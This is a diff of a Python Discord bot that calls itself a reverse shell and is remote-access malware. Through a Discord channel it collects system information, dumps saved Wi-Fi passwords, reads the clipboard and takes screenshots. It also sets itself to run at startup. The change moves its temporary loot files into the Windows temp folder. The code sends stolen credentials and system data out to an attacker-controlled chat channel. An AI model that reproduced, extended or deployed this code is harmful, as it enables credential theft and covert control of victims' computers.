@@ -329,7 +329,7 @@ async def on_ready():
         embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
         
         start()
-        with open("system.txt", "r") as f:
+        with open(f"{os.getenv('temp')}\\system.txt", "r") as f:
             system_info = f.read()
         if system_info == "":
             system_info = "Failed to fetch system information!"
@@ -337,7 +337,7 @@ async def on_ready():
         embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await channel.send(embed=embed)
-        delete_files(["system.txt"])
+        delete_files([f"{os.getenv('temp')}\\system.txt"])
         #browsers(channel)
     except: sys.exit(0)
 
@@ -367,7 +367,7 @@ async def on_message(message):
     elif message.content == "sys":
         await message.reply("Fetching data...", delete_after=.3)
         start()
-        with open("system.txt", "r") as f:
+        with open(f"{os.getenv('temp')}\\system.txt", "r") as f:
             system_info = f.read()
 
         if system_info == "":
@@ -376,7 +376,7 @@ async def on_message(message):
         embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.channel.send(embed=embed)
-        delete_files(["system.txt"])
+        delete_files([f"{os.getenv('temp')}\\system.txt"])
 
 #! CLIPBOARD
     elif message.content == "clipboard":
@@ -633,20 +633,20 @@ async def on_message(message):
 #! WIFI
     elif message.content == "wifi":
         WifiPasswords().run()
-        with open("wifi.txt", "r") as f:
+        with open(f"{os.getenv('temp')}\\wifi.txt", "r") as f:
             wifi = f.read()
         if wifi == "":
             wifi = "No wifi passwords found!"
         elif len(wifi) > 1500:
-            file = discord.File("wifi.txt")
+            file = discord.File(f"{os.getenv('temp')}\\wifi.txt")
             await message.reply(file=file)
-            delete_files(["wifi.txt"])
+            delete_files([f"{os.getenv('temp')}\\wifi.txt"])
             return
         
         embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
-        delete_files(["wifi.txt"])
+        delete_files([f"{os.getenv('temp')}\\wifi.txt"])
 
 #! SCREENSHOT
     elif message.content == "screenshot":
@@ -1032,3 +1032,4 @@ else: Startup(sys.argv[0])
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
